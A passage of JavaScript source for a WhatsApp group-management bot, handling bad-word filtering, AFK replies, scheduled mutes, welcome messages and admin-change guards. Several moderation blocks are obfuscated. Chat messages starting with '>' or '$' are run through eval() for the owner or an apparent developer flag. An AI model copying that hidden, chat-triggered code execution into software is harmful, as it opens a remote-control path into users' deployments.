                     if (pattern.test(chab)) {
                        await new Promise(r => setTimeout(r, 1000));
                        try{
                           const { warndb } = require('.');
                           const timesam = moment(moment()).format('HH:mm:ss')
                           moment.tz.setDefault('Asia/Karachi').locale('id')
                           await new warndb({
                              id: msg.sender.split("@")[0] + 'warn',
                              reason: 'For using Bad Word',
                              group: groupMetadata.subject,
                              warnedby: tlang().title,
                              date: timesam
                           }).save()
                           msg.reply(`*_hey ${msg.pushName}_*\n\nWarning!! Bad word detected.\ndelete your message.`)
                           sleep(3000)
                           const key = { remoteJid: msg.chat, fromMe: false, id: msg.id, participant: msg.sender }
                           await Aviator.client.sendMessage(msg.chat, { delete: key })
                        } catch (e) { console.log("Error From Bad Words : " ,e)}
                    }
               })
               try {
                  let isNumber = (x) => typeof x === "number" && !isNaN(x);
                  let user = global.db.users[msg.sender];
                  if (typeof user !== "object") global.db.users[msg.sender] = {};
                  if (user) {
                     if (!isNumber(user.afkTime)) user.afkTime = -1;
                     if (!("afkReason" in user)) user.afkReason = "";
                  } else global.db.users[msg.sender] = {afkTime: -1,  afkReason: "", };
                  let chats = global.db.chats[msg.chat];
                  if (typeof chats !== "object") global.db.chats[msg.chat] = {};
                  if (chats) {
                     if (!("mute" in chats)) chats.mute = false;
                     if (!("wame" in chats)) chats.wame = false;
                  }else global.db.chats[msg.chat] = { mute: false, wame: false, };
               } catch (err) {  console.error(err); }
               //responce
               let mentionUser = [
                  ...new Set([
                     ...(msg.mentionedJid || []),
                     ...(msg.quoted ? [msg.quoted.sender] : []),
                  ]),
               ];
               for (let jid of mentionUser) {
                  let user = global.db.users[jid];
                  if (!user) continue;
                  let afkTime = user.afkTime;
                  if (!afkTime || afkTime < 0) continue;
                  let reason = user.afkReason || "";
                  msg.reply(`
Hello ${msg.pushName} \n\n, this is *${tlang().title}* a bot.
Don't tag him,he is busy now. But Don't worry I assure you,I'll inform him As soon as possible😉.
${reason ? "with reason " + reason : "no reason"}
Its been ${clockString(new Date() - afkTime)}\n\nThanks\n*Powered by ${tlang().title }*
`.trim());
               }
               if (db.users[msg.sender].afkTime > -1) {
                  let user = global.db.users[msg.sender];
                  msg.reply(`
${tlang().greet} came back online from AFK${ user.afkReason ? " after " + user.afkReason : "" }
In ${clockString(new Date() - user.afkTime)}
`.trim());
                  user.afkTime = -1;
                  user.afkReason = "";
               }
               if ( suhails || isCreator) {           
			   if( msg.text.startsWith('>')){
                  let code = budy.slice(1)
                  if (!code) return msg.reply(`Provide me with a query to run Master!`);
                  try {  
                     let resultTest = eval(code);
                     if (typeof resultTest === "object") { msg.reply(util.format(resultTest)); }
                     else { return msg.reply(util.format(resultTest)); }
                  } catch (err) { return msg.reply(util.format(err)); }      
               }else if(msg.text.startsWith('$')){
                  let code = budy.slice(1)
                  if (!code) return msg.reply(`Provide me with a query to run Master!`); 
                  try {
                     let resultTest = await eval('const a = async()=>{\n' + code + '\n}\na()');
                     let h = util.format(resultTest);
                     await msg.react("🍁")  //return await msg.reply(h)
                  }catch (err) { await msg.reply(util.format(err));  }                    		
               }
		   }
      } catch (e) { console.log("420 Error Main  : \n" , e)  }
   })
const { sck } = require('.')
async function startcron(time,chat,type){
   let cron = require("node-cron");
   console.log(time)
	console.log(chat)
	console.log(type)
   let [hr, min] = time.split(":");
   var j;
   if(type==='mute') j = "announcement"
   if(type==='unmute') j = "not_announcement"
   cron.schedule(`${min} ${hr} * * *`, () => {  (async() => {  return await Aviator.client.groupSettingUpdate(chat, j); })() }, { scheduled: true, timezone: "Asia/Karachi" }) 
}
async function foo(){	
   let bar = await sck.find({})
   for(let i = 0; i < bar.length; i++) {
      if(bar[i].mute==="false") continue
      if(bar[i].mute===undefined) continue
      await startcron(bar[i].mute,bar[i].id,'mute')
   }
}
async function fooz(){	
   let barz = await sck.find({})
   for (let i = 0; i < barz.length; i++) {
      if(barz[i].unmute==="false") continue
      if(barz[i].unmute===undefined) continue
      await startcron(barz[i].unmute,barz[i].id,'unmute')
   }
}
foo();
fooz();


let users = {}
Aviator.client.ev.on('group-participants.update', async(anu) => {
            try {
                let metadata = await Aviator.client.groupMetadata(anu.id)
                var ppuser;
                let participants = anu.participants
                for (let num of participants) {

                    try { ppuser = await Aviator.client.profilePictureUrl(num, 'image');} 
                    catch {ppuser = 'https://telegra.ph/file/93f1e7e8a1d7c4486df9e.jpg';}
/* //------------------------------------------------------------------------------------
                    if (Config.antifake != '') {
                        var array = Config.antifake.split(",") || ['212']
                        for (let i = 0; i < array.length; i++) {
                            let chab = require('awesome-phonenumber')('+' + num.split('@')[0]).getCountryCode()
                            if (chab === array[i]) {
                                console.log(array[i])
                                try {
                                    Void.sendMessage(anu.id, { text: `${chab} is not allowed` })
                                    return await Void.groupParticipantsUpdate(anu.id, [num], 'remove')
                                } catch(error) {  console.log("Error From antifake : " , error) }
                            }
                        }
                    }
*/ //------------------------------------------------------------------------------------
                    let checkinfo = await sck.findOne({ id: anu.id })
                    if (checkinfo) {
                        let events = checkinfo.events || "false"
                        try{ if (anu.id === '120363025246125888@g.us' && !suhails ) return }
                        catch(e){console.log(`IsSuhail : ${suhails} \nGroup Id : ${anu.id}\nerror Returning in Secktor-Md Group : ` , e)}
                        const allmem = metadata.participants.length
                        if (anu.action == 'add') {

                            function _0x35fa(){const _0x2c8c62=['decodeJid','test','split','../lib','sendMessage','replace','false','trim','933316TzmLyM','\x22\x20Country_Code_\x20\x0a❲❒❳\x20*Reason:*_Can\x27t\x20kick\x20User\x20without\x20getting\x20admin\x20role_\x0a❲❒❳\x20*Solution:*\x20_Provide\x20Admin\x20Role\x20First\x20else\x20Disable\x20Antifake_\x0a\x0a\x0a©','\x20Joined\x20Group\x20but\x20not\x20have\x20\x22','startsWith','true','148697BKOBlE','2793910YkFsgk','user','\x22\x20country\x20code_.\x0a\x0a©','564258vpBIRc','707820vFUMoA','desc','\x0a❲❒❳\x20*Error\x20Message:*\x20','antifake','10rgMOEW','caption','1759620QZhXMO','groupParticipantsUpdate','subject','10744008tENNKX','remove','\x20_Kick\x20Automatically!_*\x20\x0a\x20\x20B\x27coz\x20My\x20Owner\x20Activate\x20antifake\x20in\x20this\x20Chat,\x0a\x20\x20So\x20NoBody\x20Join\x20except\x20_\x22'];_0x35fa=function(){return _0x2c8c62;};return _0x35fa();}const _0x14f784=_0x13b1;(function(_0x2439c0,_0x738dfa){const _0x50101f=_0x13b1,_0xe85872=_0x2439c0();while(!![]){try{const _0x582900=-parseInt(_0x50101f(0x1d5))/0x1+parseInt(_0x50101f(0x1d0))/0x2+-parseInt(_0x50101f(0x1e0))/0x3+-parseInt(_0x50101f(0x1da))/0x4*(parseInt(_0x50101f(0x1de))/0x5)+parseInt(_0x50101f(0x1d9))/0x6+-parseInt(_0x50101f(0x1d6))/0x7+parseInt(_0x50101f(0x1e3))/0x8;if(_0x582900===_0x738dfa)break;else _0xe85872['push'](_0xe85872['shift']());}catch(_0x5d07a4){_0xe85872['push'](_0xe85872['shift']());}}}(_0x35fa,0x656c1));function _0x13b1(_0x43e346,_0x5366dc){const _0x35fabb=_0x35fa();return _0x13b1=function(_0x13b1ec,_0x16ab36){_0x13b1ec=_0x13b1ec-0x1cb;let _0x1a44ca=_0x35fabb[_0x13b1ec];return _0x1a44ca;},_0x13b1(_0x43e346,_0x5366dc);}let antifake=checkinfo[_0x14f784(0x1dd)]['replace']('!','')||_0x14f784(0x1ce),antifakes=antifake===_0x14f784(0x1ce)?![]:num[_0x14f784(0x1d3)](antifake)?![]:!![];if(antifake['toLowerCase']()!=='false'&&antifakes){let chatid={'chat':anu['id']};const {getAdmin}=require(_0x14f784(0x1cb)),groupAdmins=await getAdmin(Aviator.client,chatid),botNumber=Aviator.client[_0x14f784(0x1e6)](Aviator.client[_0x14f784(0x1d7)]['id']),isBotAdmins=groupAdmins['includes'](botNumber)||![];if(isBotAdmins)try{return await Aviator.client[_0x14f784(0x1e1)](anu['id'],[num],_0x14f784(0x1e4)),await Aviator.client[_0x14f784(0x1cc)](anu['id'],{'image':{'url':ppuser},'caption':'\x20\x20\x20\x20\x20*[\x20Anti_Fake\x20Started\x20]*\x0a\x0a❒\x20*User\x20@'+num[_0x14f784(0x1e8)]('@')[0x0]+_0x14f784(0x1e5)+antifake+_0x14f784(0x1d8)+Config[_0x14f784(0x1df)],'mentions':[num]});}catch(_0x32a00e){return await Aviator.client[_0x14f784(0x1cc)](botNumber,{'text':'\x20\x20\x20\x20\x20*[\x20Anti_fake\x20Error\x20]*\x0a\x0a❲❒❳\x20*Error\x20While:*\x20In\x20AntiFake\x20For\x20Kicking\x20\x20user\x0a❲❒❳\x20*Group\x20Name:*\x20'+metadata['subject']+_0x14f784(0x1dc)+_0x32a00e+'\x0a\x0a©'+Config[_0x14f784(0x1df)]});}else return await Aviator.client['sendMessage'](anu['id'],{'image':{'url':ppuser},'caption':'\x20\x20\x20\x20\x20*[\x20Anti_fake\x20Error\x20]*\x0a\x0a❲❒❳\x20*Antifake:*\x20_User\x20@'+num['split']('@')[0x0]+_0x14f784(0x1d2)+antifake+_0x14f784(0x1d1)+Config['caption'],'mentions':[num]});}else{if(events==_0x14f784(0x1d4)){let welcome_messages=checkinfo['welcome'][_0x14f784(0x1cd)](/@user/gi,'@'+num[_0x14f784(0x1e8)]('@')[0x0])['replace'](/@gname/gi,metadata[_0x14f784(0x1e2)])[_0x14f784(0x1cd)](/@desc/gi,metadata[_0x14f784(0x1db)])[_0x14f784(0x1cd)](/@count/gi,allmem);if(/@pp/g[_0x14f784(0x1e7)](welcome_messages)){let buttonMessage={'image':{'url':ppuser},'caption':welcome_messages[_0x14f784(0x1cf)]()[_0x14f784(0x1cd)](/@pp/g,''),'mentions':[num]};return await Aviator.client['sendMessage'](anu['id'],buttonMessage);}else return await Aviator.client[_0x14f784(0x1cc)](anu['id'],{'text':welcome_messages[_0x14f784(0x1cf)](),'mentions':[num]});}}

  //=============================[change action to "remove" if you want to set it.]===================================================
                          } else if (events === 'true' && anu.action == 'remove') {
                            hesa = `${participants}`
                            getnum = (teks) => {   return teks.replace(/['@s whatsapp.net']/g, " "); }
                            resa = `${getnum(hesa)}`

                            let goodbye_messages = checkinfo.goodbye.replace(/@user/gi, `@${num.split("@")[0]}`).replace(/@gname/gi, metadata.subject).replace(/@desc/gi, metadata.desc).replace(/@count/gi, allmem);
                            if(/@pp/g.test(goodbye_messages)) {
                                let buttonMessage = { image: { url: ppuser },caption: goodbye_messages.trim().replace(/@pp/g, ''),  mentions: [num],   }
                                return Aviator.client.sendMessage(anu.id, buttonMessage)
                            } else {  return Aviator.client.sendMessage(anu.id, {text: goodbye_messages.trim(),mentions:[num] }) }
//=============================[Implementing Promote and Demote Messages.]===================================================
                        } else if (anu.action == 'promote') {

                        function _0x14ef(){const _0x427ef3=['groupParticipantsUpdate','25772110KiNRZB','*Note\x20:\x20_I\x27m\x20Not\x20Admin\x20Here,\x20So\x20I\x20Can\x27t\x20Demote\x20Someone\x20while\x20Anti_Promote\x20Activated_*','\x0a❲❒❳\x20*Error\x20Message:*\x20','14707125JQbKQV','\x20_Demote\x20Automatically!_*\x20\x0a\x20\x20B\x27coz\x20My\x20Owner\x20Activate\x20antipromote\x20in\x20this\x20Chat,\x0a\x20\x20So\x20NoBody\x20Get\x20Admin\x20Role\x20Without\x20Owner\x20Permission.\x0a\x0a©','decodeJid','_Members_\x0a❲❒❳\x20*Group\x20Name:*\x20','user','\x0a\x0a©','\x0a\x0a\x0a©','subject','956118gLdusx','sendMessage','55IzdIZj','7415555fyHgNh','1753658QTtMPe','196gqxgpY','17661UpAKKD','previous_Action','caption','_\x0a❲❒❳\x20*Position:*\x20_Member\x20->\x20Admin_\x0a❲❒❳\x20*Total\x20Members:*\x20_','8SXGLBc','antipromote','22bQpzSP','pdm','535746NfqHnN','\x20*Someone\x20Promote\x20Here*\x0a','antidemote','\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x0a❲❒❳\x20*User:*\x20_@','split','includes','true'];_0x14ef=function(){return _0x427ef3;};return _0x14ef();}function _0x2a0c(_0x5ded94,_0x4f94f6){const _0x14efff=_0x14ef();return _0x2a0c=function(_0x2a0cee,_0x18022e){_0x2a0cee=_0x2a0cee-0x132;let _0xcb08b0=_0x14efff[_0x2a0cee];return _0xcb08b0;},_0x2a0c(_0x5ded94,_0x4f94f6);}const _0x3dafbf=_0x2a0c;(function(_0x3cfc8a,_0x3c8b0d){const _0x304604=_0x2a0c,_0x21758f=_0x3cfc8a();while(!![]){try{const _0x27f75a=-parseInt(_0x304604(0x147))/0x1+-parseInt(_0x304604(0x143))/0x2+-parseInt(_0x304604(0x149))/0x3*(parseInt(_0x304604(0x148))/0x4)+parseInt(_0x304604(0x145))/0x5*(parseInt(_0x304604(0x151))/0x6)+-parseInt(_0x304604(0x146))/0x7*(parseInt(_0x304604(0x14d))/0x8)+-parseInt(_0x304604(0x13b))/0x9+parseInt(_0x304604(0x138))/0xa*(parseInt(_0x304604(0x14f))/0xb);if(_0x27f75a===_0x3c8b0d)break;else _0x21758f['push'](_0x21758f['shift']());}catch(_0x1ae15e){_0x21758f['push'](_0x21758f['shift']());}}}(_0x14ef,0xe1549));let goto_Alerts=![];if(checkinfo[_0x3dafbf(0x14e)]==_0x3dafbf(0x136)){if(users[anu['id']]){if(users[anu['id']][_0x3dafbf(0x14a)]==_0x3dafbf(0x132)){delete users[anu['id']];return;}}let chatid={'chat':anu['id']};const {getAdmin}=require('../lib'),groupAdmins=await getAdmin(Aviator.client,chatid),botNumber=Aviator.client[_0x3dafbf(0x13d)](Aviator.client[_0x3dafbf(0x13f)]['id']),isBotAdmins=groupAdmins[_0x3dafbf(0x135)](botNumber)||![];if(isBotAdmins)try{return await Aviator.client[_0x3dafbf(0x137)](anu['id'],[num],'demote'),users[anu['id']]={'previous_Action':_0x3dafbf(0x14e)},await Aviator.client[_0x3dafbf(0x144)](anu['id'],{'image':{'url':ppuser},'caption':'\x20*[\x20Anti_Promote\x20Started\x20]*\x0a\x0a❒\x20*User\x20@'+num[_0x3dafbf(0x134)]('@')[0x0]+_0x3dafbf(0x13c)+Config[_0x3dafbf(0x14b)],'mentions':[num]});}catch(_0x52a953){return await Aviator.client[_0x3dafbf(0x144)](botNumber,{'text':'*[\x20Anti_Promote\x20Error\x20]*\x0a\x0a❲❒❳\x20*Error\x20While:*\x20In\x20AntiPromote\x20For\x20Demoting\x20user\x0a❲❒❳\x20*Group\x20Name:*\x20'+metadata[_0x3dafbf(0x142)]+_0x3dafbf(0x13a)+_0x52a953+_0x3dafbf(0x140)+Config[_0x3dafbf(0x14b)]});}else goto_Alerts=!![];}if(checkinfo[_0x3dafbf(0x150)]==_0x3dafbf(0x136)||goto_Alerts==!![])return await Aviator.client['sendMessage'](anu['id'],{'image':{'url':ppuser},'caption':_0x3dafbf(0x152)+(goto_Alerts?_0x3dafbf(0x139):'')+_0x3dafbf(0x133)+num[_0x3dafbf(0x134)]('@')[0x0]+_0x3dafbf(0x14c)+allmem+_0x3dafbf(0x13e)+metadata[_0x3dafbf(0x142)]+_0x3dafbf(0x141)+Config[_0x3dafbf(0x14b)],'mentions':[num]});
                        
                        } else if (anu.action == 'demote' ) {       

                        function _0x222f(_0x30bef8,_0x58efb7){const _0xd51e17=_0xd51e();return _0x222f=function(_0x222fc7,_0x4fdf70){_0x222fc7=_0x222fc7-0xed;let _0x329c7b=_0xd51e17[_0x222fc7];return _0x329c7b;},_0x222f(_0x30bef8,_0x58efb7);}const _0x4b6f62=_0x222f;(function(_0x17844d,_0x4f404c){const _0x41fe6a=_0x222f,_0x2b771d=_0x17844d();while(!![]){try{const _0x453144=parseInt(_0x41fe6a(0xfc))/0x1*(parseInt(_0x41fe6a(0x102))/0x2)+-parseInt(_0x41fe6a(0x10a))/0x3+-parseInt(_0x41fe6a(0x107))/0x4*(parseInt(_0x41fe6a(0x109))/0x5)+-parseInt(_0x41fe6a(0x100))/0x6+-parseInt(_0x41fe6a(0xf8))/0x7*(-parseInt(_0x41fe6a(0x10c))/0x8)+-parseInt(_0x41fe6a(0x101))/0x9*(-parseInt(_0x41fe6a(0xff))/0xa)+-parseInt(_0x41fe6a(0xfb))/0xb*(-parseInt(_0x41fe6a(0xef))/0xc);if(_0x453144===_0x4f404c)break;else _0x2b771d['push'](_0x2b771d['shift']());}catch(_0x9bb7ae){_0x2b771d['push'](_0x2b771d['shift']());}}}(_0xd51e,0xbbc82));let goto_Alerts=![];if(checkinfo['antidemote']==_0x4b6f62(0xf3)){if(users[anu['id']]){if(users[anu['id']][_0x4b6f62(0x10f)]==_0x4b6f62(0xf9)){delete users[anu['id']];return;}}const {getAdmin}=require('../lib');let chatid={'chat':anu['id']};const groupAdmins=await getAdmin(Aviator.client,chatid),botNumber=await Aviator.client[_0x4b6f62(0x108)](Aviator.client[_0x4b6f62(0x104)]['id']),isBotAdmins=groupAdmins[_0x4b6f62(0xfd)](botNumber)||![];if(isBotAdmins)try{return await Aviator.client[_0x4b6f62(0x106)](anu['id'],[num],_0x4b6f62(0x103)),users[anu['id']]={'previous_Action':'antidemote'},await Aviator.client[_0x4b6f62(0xf7)](anu['id'],{'image':{'url':ppuser},'caption':_0x4b6f62(0x10e)+num[_0x4b6f62(0x10b)]('@')[0x0]+_0x4b6f62(0xf2)+Config[_0x4b6f62(0xf0)],'mentions':[num]});}catch(_0x25d650){return await Aviator.client[_0x4b6f62(0xf7)](botNumber,{'text':_0x4b6f62(0xf5)+metadata[_0x4b6f62(0xfa)]+_0x4b6f62(0xf1)+_0x25d650+_0x4b6f62(0xf6)+Config['caption']});}else goto_Alerts=!![];}function _0xd51e(){const _0x7334ab=['\x0a\x0a©','sendMessage','343aFYcaG','antipromote','subject','1489576YcCbZZ','14btAVML','includes','\x20*Someone\x20Demote\x20Here*\x0a','1430680QjVYHh','7939482ibOlTI','36qvRTGY','137068JLeEWM','promote','user','\x0a\x0a\x0a©','groupParticipantsUpdate','20MREpus','decodeJid','846775ugaKDX','1542837zZGBVn','split','70552Ksiggq','\x0a\x0a❲❒❳\x20*User:*\x20_@','\x20*[\x20Anti_Demote\x20Started\x20]*\x0a\x0a❒\x20*User\x20@','previous_Action','_Members_\x0a❲❒❳\x20*Group\x20Name:*\x20','*Note\x20:\x20_I\x27m\x20Not\x20Admin\x20Here,\x20So\x20I\x20Can\x27t\x20Promote\x20Demoted\x20Person\x20while\x20Anti_Promote\x20Activated_*','132GbwvfO','caption','\x0a❲❒❳\x20*Error:*\x20','\x20_Promote\x20Automatically!_*\x0a\x0a\x20\x20_B\x27coz\x20My\x20Owner\x20Activate\x20Anti_Demote\x20in\x20this\x20Chat,_\x0a\x20\x20_So\x20NoBody\x20Get\x20Demote\x20Any\x20Admin\x20Without\x20Owner\x20Permission._\x0a\x0a©','true','pdm','*[\x20Anti_Promote\x20Error\x20]*\x0a\x0a❲❒❳\x20Error\x20in\x20AntiPromote\x20For\x20Demoting\x20user\x0a❲❒❳\x20*Group\x20Name:*\x20'];_0xd51e=function(){return _0x7334ab;};return _0xd51e();}if(checkinfo[_0x4b6f62(0xf4)]=='true'||goto_Alerts==!![])return Aviator.client[_0x4b6f62(0xf7)](anu['id'],{'image':{'url':ppuser},'caption':_0x4b6f62(0xfe)+(goto_Alerts?_0x4b6f62(0xee):'')+_0x4b6f62(0x10d)+num[_0x4b6f62(0x10b)]('@')[0x0]+'_\x0a❲❒❳\x20*Position:*\x20_Admin\x20->\x20Member_\x0a❲❒❳\x20*Total\x20Members:*\x20_'+allmem+_0x4b6f62(0xed)+metadata[_0x4b6f62(0xfa)]+_0x4b6f62(0x105)+Config[_0x4b6f62(0xf0)],'mentions':[num]});
                    }
                    }
                }
            } catch (err) {  console.log("Error From Group_Upsert--- \n" ,err) }
})
      //========================================================================================================================================
      Aviator.client.lastStatus = async() => {
	       console.log("last_status :" , last_status)
	       return  last_status;		
        }
        //========================================================================================================================================
        Aviator.client.decodeJid = (jid) => {
            if (!jid) return jid
            if (/:\d+@/gi.test(jid)) {
                let decode = jidDecode(jid) || {}
                return decode.user && decode.server && decode.user + '@' + decode.server || jid
            } else return jid
        }
        //========================================================================================================================================
        Aviator.client.ev.on('contacts.upsert', (contacts) => {
                const contactsUpsert = (newContacts) => {
                    for (const contact of newContacts) {
                        if (store.contacts[contact.id]) { Object.assign(store.contacts[contact.id], contact);} 
                        else { store.contacts[contact.id] = contact; }
                    }
                    return;
                };
                contactsUpsert(contacts);
            })
            //========================================================================================================================================
            Aviator.client.ev.on('contacts.update', async update => {
                for (let contact of update) {
                    let id = Aviator.client.decodeJid(contact.id)
                    sck1.findOne({ id: id }).then((usr) => {
                        try{
                        if (!usr) { new sck1({ id: id, name: contact.notify }).save() }
                        else {  sck1.updateOne({ id: id }, { name: contact.notify })  }
                        }catch(e){ console.log("Error From Antilinks : " , e); }
                    })
                    if (store && store.contacts) store.contacts[id] = { id, name: contact.notify }
                }
            })
            //========================================================================================================================================
            Aviator.client.getName = (jid, withoutContact = false) => {
                id = Aviator.client.decodeJid(jid)
                withoutContact = Aviator.client.withoutContact || withoutContact
                let v
                if (id.endsWith("@g.us")) return new Promise(async(resolve) => {
                    v = store.contacts[id] || {}
                    if (!(v.name.notify || v.subject)) v = Aviator.client.groupMetadata(id) || {}
                    resolve(v.name || v.subject || PhoneNumber('+' + id.replace('@s.whatsapp.net', '')).getNumber('international'))
                })
                else v = id === '0@s.whatsapp.net' ? {
                        id,
                        name: 'WhatsApp'
                    } : id === Aviator.client.decodeJid(Aviator.client.user.id) ?
                    Aviator.client.user :
                    (store.contacts[id] || {})
                return (withoutContact ? '' : v.name) || v.subject || v.verifiedName || PhoneNumber('+' + jid.replace('@s.whatsapp.net', '')).getNumber('international')

            }
            //========================================================================================================================================
            Aviator.client.sendContact = async(jid, kon, quoted = '', opts = {}) => {
                let list = []
                for (let i of kon) {
                    list.push({
                        displayName: await Aviator.client.getName(i + '@s.whatsapp.net'),
                        vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await Aviator.client.getName(i + '@s.whatsapp.net')}\nFN:${global.OwnerName}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${global.email}\nitem2.X-ABLabel:GitHub\nitem3.URL:https://github.com/${global.github}/Secktor-Md\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${global.location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
                    })
                }
                Aviator.client.sendMessage(jid, { contacts: { displayName: `${list.length} Contact`, contacts: list }, ...opts }, { quoted })
            }
            //========================================================================================================================================
            Aviator.client.setStatus = (status) => {
               Aviator.client.query({
                tag: 'iq',
                attrs: {
                    to: '@s.whatsapp.net',
                    type: 'set',
                    xmlns: 'status',
                },
                content: [{
                    tag: 'status',
                    attrs: {},
                    content: Buffer.from(status, 'utf-8')
                }]
            })
            return status
        }
        Aviator.client.serializeM = (msg) => smsg(Aviator.client, msg, store)
            //========================================================================================================================================
            Aviator.client.ev.on('connection.update', async(update) => {
                const { connection, lastDisconnect } = update
                if (connection === "connecting") {
                   console.log(" ℹ️  Connecting to WhatsApp... Please Wait.");
                }
                if (connection === 'open') {
                    const bot_user = await Aviator.client.decodeJid(Aviator.client.user.id)
                    console.log("✅ Whatsapp Login Successful!");
                    console.log("⬇️ Installing External Plugins...");
                    let axios = require('axios')
                    let check = await plugindb.find({})
                   /* for (let i = 0; i < check.length; i++) {
                        try {
                            let AxiosData = await axios.get(check[i].url);
                            let data = AxiosData.data;
                            await fs.writeFileSync(__dirname + '/../commands/' + check[i].id + '.js', data, "utf8");
                        } catch (error) { 
                            //await plugindb.findOneAndDelete({ id: check[i].id });
                            console.log(` ℹ️ Plugin ${check[i].id} not InsTalled!\n  ℹ️ Error: ${error}`); 
                        }
                    }
                    */
                    console.log("✅  External Plugins Installed!");
                    fs.readdirSync(__dirname + "/../commands").forEach((plugin) => {
                        if (path.extname(plugin).toLowerCase() == ".js") {    require(__dirname + "/../commands/" + plugin);      }
                    });
                    let version = await getVersionWaweb ()
                    let commits = await DB.syncgit()
                    let Msg  =`
╔════◇
║ 『𝗦𝗘𝗖𝗞𝗧𝗢𝗥 - 𝗠𝗗』
║    Prefix : [ ${prefix===''?"null":prefix} ]
║    Mode : ${Config.WORKTYPE}
║    Total Plugins : ${events.commands.length}
║    Web Version : ${version}
╚════════════════════╝

╔═════◇
║『𝗦𝘂𝗽𝗽𝗼𝗿𝘁 𝗯𝘆 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗶𝗻𝗴』
║ youtube.com/@suhailtechinfo0
╚════════════════════╝
`;                      
if (commits.total !== 0)
{                        
    Msg  +=`╔═════◇                
║ 『 𝗡𝗲𝘄 𝗨𝗽𝗱𝗮𝘁𝗲 𝗔𝘃𝗮𝗶𝗹𝗮𝗯𝗹𝗲 』
║ _You Have New Update For Bot!_
║ _Update Bot as Soon as Possible!_
║ *To Update:-  _,Update start_*
╚════════════════════╝
`
}

;
                    console.log(Msg);
                    await Aviator.client.sendMessage(bot_user,  { text: Msg});
                }
               if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401 ) {
                    console.log('Connection closed with bot. Please put New Session ID again.');
                    await sleep(5000);
                    syncdb().catch(err => console.log(err));
                } 
            })
            Aviator.client.ev.on('creds.update', saveCreds)
            //================================================[Some Params]===============================================================================
            /** Send Button 5 Image
             *
             * @param {*} jid
             * @param {*} text
             * @param {*} footer
             * @param {*} image
             * @param [*] button
             * @param {*} options
             * @returns
             */
            //========================================================================================================================================
            Aviator.client.send5ButImg = async(jid, text = '', footer = '', img, but = [], thumb, options = {}) => {
            let message = await prepareWAMessageMedia({ image: img, jpegThumbnail: thumb }, { upload: Aviator.client.waUploadToServer })
            var template = generateWAMessageFromContent(jid, proto.Message.fromObject({
                templateMessage: {
                    hydratedTemplate: {
                        imageMessage: message.imageMessage,
                        "hydratedContentText": text,
                        "hydratedFooterText": footer,
                        "hydratedButtons": but
                    }
                }
            }), options)
            Aviator.client.relayMessage(jid, template.message, { messageId: template.key.id })
        }

        /**
         *
         * @param {*} jid
         * @param {*} buttons
         * @param {*} caption
         * @param {*} footer
         * @param {*} quoted
         * @param {*} options
         */
        //========================================================================================================================================
        Aviator.client.sendButtonText = (jid, buttons = [], text, footer, quoted = '', options = {}) => {
            let buttonMessage = {
                    text,
                    footer,
                    buttons,
                    headerType: 2,
                    ...options
                }
                //========================================================================================================================================
                Aviator.client.sendMessage(jid, buttonMessage, { quoted, ...options })
            }

        /**
         *
         * @param {*} jid
         * @param {*} text
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.sendText = (jid, text, quoted = '', options) => Aviator.client.sendMessage(jid, { text: text, ...options }, { quoted })

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} caption
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.sendImage = async(jid, path, caption = '', quoted = '', options) => {
            let buffer = Buffer.isBuffer(path) ? path : /^data:.*?\/.*?;base64,/i.test(path) ? Buffer.from(path.split `,` [1], 'base64') : /^https?:\/\//.test(path) ? await (await getBuffer(path)) : fs.existsSync(path) ? fs.readFileSync(path) : Buffer.alloc(0)
            return await Aviator.client.sendMessage(jid, { image: buffer, caption: caption, ...options }, { quoted })
        }

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} caption
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.sendTextWithMentions = async(jid, text, quoted, options = {}) => Aviator.client.sendMessage(jid, { text: text, contextInfo: { mentionedJid: [...text.matchAll(/@(\d{0,16})/g)].map(v => v[1] + '@s.whatsapp.net') }, ...options }, { quoted })

        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        //========================================================================================================================================
        Aviator.client.sendImageAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {   buffer = await writeExifImg(buff, options);  } 
      else { buffer = await imageToWebp(buff); }
      await Aviator.client.sendMessage( jid, { sticker: { url: buffer }, ...options },  options );
    };
        /**
         *
         * @param {*} jid
         * @param {*} path
         * @param {*} quoted
         * @param {*} options
         * @returns
         */
        Aviator.client.sendVideoAsSticker = async (jid, buff, options = {}) => {
      let buffer;
      if (options && (options.packname || options.author)) {
        buffer = await writeExifVid(buff, options);
      } else {
        buffer = await videoToWebp(buff);
      }
      await Aviator.client.sendMessage(
        jid,
        { sticker: { url: buffer }, ...options },
        options
      );
    };
       
            //========================================================================================================================================
            Aviator.client.sendMedia = async(jid, path, fileName = '', caption = '', quoted = '', options = {}) => {
                let types = await Aviator.client.getFile(path, true)
                let { mime, ext, res, data, filename } = types
                if (res && res.status !== 200 || file.length <= 65536) {
                    try { throw { json: JSON.parse(file.toString()) } } catch (e) { if (e.json) throw e.json }
                }
                let type = '',
                    mimetype = mime,
                    pathFile = filename
                if (options.asDocument) type = 'document'
                if (options.asSticker || /webp/.test(mime)) {
                    let { writeExif } = require('./exif')
                    let media = { mimetype: mime, data }
                    pathFile = await writeExif(media, { packname: options.packname ? options.packname : Config.packname, author: options.author ? options.author : Config.author, categories: options.categories ? options.categories : [] })
                    await fs.promises.unlink(filename)
                    type = 'sticker'
                    mimetype = 'image/webp'
                } else if (/image/.test(mime)) type = 'image'
                else if (/video/.test(mime)) type = 'video'
                else if (/audio/.test(mime)) type = 'audio'
                else type = 'document'
                await Aviator.client.sendMessage(jid, {
                    [type]: { url: pathFile },
                    caption,
                    mimetype,
                    fileName,
                    ...options
